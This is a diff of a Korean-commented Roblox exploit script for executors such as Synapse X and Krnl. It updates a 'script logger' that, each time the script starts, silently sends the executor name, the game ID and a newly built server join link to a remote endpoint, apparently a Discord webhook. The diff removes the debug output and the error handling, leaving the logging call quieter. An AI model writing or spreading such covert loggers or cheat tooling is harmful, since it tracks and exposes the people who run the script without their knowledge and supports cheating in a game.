@@ -19,11 +19,10 @@ local function sendToDiscord()
         platformEmoji = "🎮"
     end
     
-    -- 실행기 감지 (모든 실행기 호환)
+    -- 실행기 감지
     local executor = "알 수 없음"
     local requestFunc = nil
     
-    -- 실행기별 HTTP 함수 감지
     if syn and syn.request then
         requestFunc = syn.request
         executor = "Synapse X"
@@ -41,25 +40,13 @@ local function sendToDiscord()
         executor = "Krnl"
     elseif is_sirhia then
         executor = "Sirius"
-        -- Sirius는 별도 함수 필요할 수 있음
     elseif identifyexecutor then
         local success, result = pcall(identifyexecutor)
-        if success then 
-            executor = result
-        end
+        if success then executor = result end
     end
     
-    -- 실행기 이름에 이모지 추가
-    local executorEmoji = "⚙️"
-    if string.find(executor, "Synapse") then
-        executorEmoji = "🧠"
-    elseif string.find(executor, "Fluxus") then
-        executorEmoji = "🌊"
-    elseif string.find(executor, "Krnl") then
-        executorEmoji = "👑"
-    elseif string.find(executor, "Sirius") then
-        executorEmoji = "⭐"
-    end
+    -- 서버 참가 링크 생성
+    local serverLink = "https://www.roblox.com/share?type=server&id=" .. game.JobId .. "&placeId=" .. game.PlaceId
     
     local data = {
         ["content"] = "",
@@ -89,28 +76,27 @@ local function sendToDiscord()
                 },
                 {
                     ["name"] = "⚡ 실행기",
-                    ["value"] = executorEmoji .. " **" .. executor .. "**",
+                    ["value"] = executor,
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "🎮 게임",
+                    ["name"] = "🎮 게임 ID",
                     ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "🌐 서버",
-                    ["value"] = "```" .. game.JobId .. "```",
+                    ["name"] = "🌐 서버 참가 링크",
+                    ["value"] = "[🔗 클릭해서 접속하기](" .. serverLink .. ")",
                     ["inline"] = false
                 }
             },
             ["footer"] = {
-                ["text"] = "스크립트 로거 v3.0 • 모든 실행기 지원"
+                ["text"] = "스크립트 로거 v3.1 • 서버 링크 포함"
             },
             ["timestamp"] = DateTime.now():ToIsoDate()
         }}
     }
 
-    -- HTTP 요청 시도
     if requestFunc then
         pcall(function()
             requestFunc({
@@ -120,18 +106,10 @@ local function sendToDiscord()
                 Body = game:GetService("HttpService"):JSONEncode(data)
             })
         end)
-    else
-        -- HTTP 요청 함수가 없으면 게임 로그로 출력 (디버깅용)
-        print("웹훅 전송 실패 - 실행기 미지원")
-        print("전송될 데이터:", game:GetService("HttpService"):JSONEncode(data))
     end
 end
 
--- 스크립트 시작할 때 실행
-local success, err = pcall(sendToDiscord)
-if not success then
-    print("웹훅 오류:", err)
-end
+sendToDiscord()
 
 -- =============================================
 -- [ 키 시스템 (먼저 실행됨) ]
